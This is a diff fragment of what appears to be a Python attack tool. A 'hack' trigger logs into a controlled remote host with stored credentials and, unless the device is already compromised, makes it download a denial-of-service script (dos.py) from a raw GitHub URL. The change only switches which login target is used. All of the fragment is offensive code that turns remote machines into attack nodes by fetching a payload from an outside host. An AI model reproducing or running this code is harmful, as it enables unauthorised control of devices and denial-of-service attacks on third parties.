@@ -58,8 +58,8 @@ if __name__ == '__main__':
     #path = b'https://github.com/bl201809/bllist/tree/master/20180907/dos.py'
     path = b'https://raw.githubusercontent.com/bl201809/bllist/master/dos/dos.py'
     hack = Trigger()
-    #dev = hack.login(Host_ctrled,username,passwd)
-    dev = hack.login(Host_attack,user,pawd)
+    dev = hack.login(Host_ctrled,username,passwd)
+    #dev = hack.login(Host_attack,user,pawd)
     if not hack.checkIN(dev):
         hack.dosDownLoad(dev,path)
     time.sleep(2)
